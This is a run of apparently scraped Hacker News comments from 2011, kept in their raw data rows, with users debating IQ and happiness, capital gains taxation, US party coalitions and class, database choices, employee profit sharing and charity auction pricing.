I look at the people in my life that live ""a good life"" and the people I see succeeding are those with very little.  I don't question, for one moment, that higher IQ leads to more opportunity, more money, more things.  When I look at people who are happy, by the values upon which I place importance, the things that high IQ bring to the table aren't relevant.  Maybe I have it all wrong, and I certainly don't have a statistical sampling to prove my point - just an observation!",1313467093

Is this entrepreneur undergoing undue hardship?<p>What's barely any income for someone who builds a $10M company?  60k?  50k?  It's certainly not $10,890 (the federal poverty level).  Even if we're talking about a business owner who takes no income, it's because they're living off of the money they've already earned, not because they're taking welfare checks while running their business.<p>I would alo like to remind you that your typical employee, who's paying the higher tax rate, will be laid off in years of recession, may have to take a lower salary because of outsourcing, etc.  I'm not going to classify one hardship versus the other, but I do want to point out that the business owner usually has a higher mean salary, even if the variance is larger.<p>You ask what the entrepreneur's incentive is if his gains are taxed like ordinary income?  That's simple: money, and lots of it.  Business ownership is a risk, and it comes with a reward.<p>Do you really think that a higher tax rate will stop an entrepreneur from creating a company?  I dare you to head down to Startup Camp, and ask anyone there if they are planning to start a company because they expect to receive a lower tax rate.  I can save you some time: they won't.  There's a passion and a drive that accompanies entrepreneurs, and they will start companies because that's what they want to do, what they need to do.<p>If entrepreneurs choose to take a higher salary during the course of the business, that's fine, it's just tax planning.  Anyone with sizable income does it.<p>You say there is a reason why society created a lower tax rate for capital gains, and that's true, but the economic situations of those times were different than now. I would suggest to you there was also a reason why there were bloody revolutions against the aristocratic class.<p>The rules of our society must continually adapt to the situation at hand.

2889750,comment,2885367,2885935,1,0,forkandwait,,,"Forgive my reply to myself, but I have been thinking about this all day.  Here are some random thoughts, partly for my own edification, but partly because the conversation seems to be lingering:<p>I actually think the ""core"" of the democratic part / left is the marginalized on one hand, and those that minister to them on the other.  The white working class aren't really marginalized like they were in the depression and earlier, so don't fit in anymore --  but the super poor are marginalized, so they fit.  Non-whites are interesting -- 40 years ago, blacks and latinos were marginalized as weirdos, except they were poor too (double whammy -- like being gay AND broke all the time).  Now that we are actually becoming a less racist and homophobic society (slowly and imperfectly, but definitely) these folks lose their marginalization and drift away from the core since social conservativism and personal character ideologies become more appropriate, unless they go to college and become social workers and join the ministering class rather than the ministered-to class.  The Republicans see this with latinos and keep trying to bring them in; they haven't succeeded yet, but they will, just like they did with Italians and Catholics.<p>The other, maybe dominant group now, in the democratic party are those folks who would have been ""Rockefeller Republicans"" back before Reagan and Goldwater redefined the party.  My family is in this camp, and so are, I think, all the smart capitalists who run/ own businesses that require lots of infrastructure and educated employees -- the Hewletts and the Packards, Bill Gates, Hollywood, Google, the rest of the educated ""blue"" USA.  These guys rightly understand that simplistic market bullshit and simplistic christian bullshit are not appropriate to a complex industrial economy.  Remember, Carnegie ordered the slaughter of unionizing steelworkers, but he also understood his world was completely fucked without universities and libraries to make his engineers and managers.  He could have been a Clinton democrat today.<p>A couple of replies to people:<p>Yeah, Eric Hoffer is great -- I only read the true believer, but it made a huge impression on me; I am sure I repeat him without knowing it.<p>To the guy who asks why the Joe Sixpack world doesn't evolve its own leaders (forgive me if I paraphrase too brutally): because they lack the training or they wouldn't be joe sixpacks in the first place...  It is mostly the managerial class (myself) or the owning class (my friends at prep-school) who have the know-how to organize people into social systems like political parties, churches, businesses, and the like.  The working class have great hand-eye coordination, but pretty crappy social and language skills (sorry for the gross generalization, but I think you understand what I am trying to say); those that do have these skills tend to drift upward into the managerial class.  When there is no room for these smart organizers to promote, they get involved in union politics or communist cells (or avoid the question altogether by getting involved in the arts/ drugs/ weird religious things / whatever.)<p>So here is my parting thought:  There is a vacuum organizing the working class today, and if someone put their finger on the cultural stuff like the Republicans do, but also fought for working people's <i>actual</i> interests, it could be a WILD ride.

Not saying there aren't use cases where that's valuable (analytics/warehousing db for one) but it's not what most people are looking for.  Is this usable as a transactional store?  What do those numbers look like?<p>The pipeline model is very interesting, though, and I'll take a look for our warehouse, which at some point became too expensive to keep up with.",1313464569

A typical employee profit sharing means the employees shares in profits but not in an acquisition unless they also get stock options.  In the scheme described, the employees share in acquisitions but not profit.  So it is the anti-profit sharing.  Anti- not meaning bad.  Anti- meaning opposite.  Maybe not the deepest thing in the world, but geez, you took it a bit too seriously.",1313464401

If a price is set at a certain point at the start, then it doesn't take hundreds or thousands of bids from users in order to reach the market value. I'm sure Alexis's time is worth north of 500 an hour - wouldn't it be interesting if he could charge that much and give to charity? instead of hoping that thousands of HN readers will bid some quarters and maybe muster a grand total of 50 dollars for a whopping hour of donated time for charity.<p>If all the losers bids were still collected, penny auction style, then maybe there is a way it can net more than the 'set value' method of pricing. Otherwise it seems like charities would be losing a lot of money, atleast for the time being while the markets are inefficient and you can hire tech gurus for $1 a minute.",1313463913
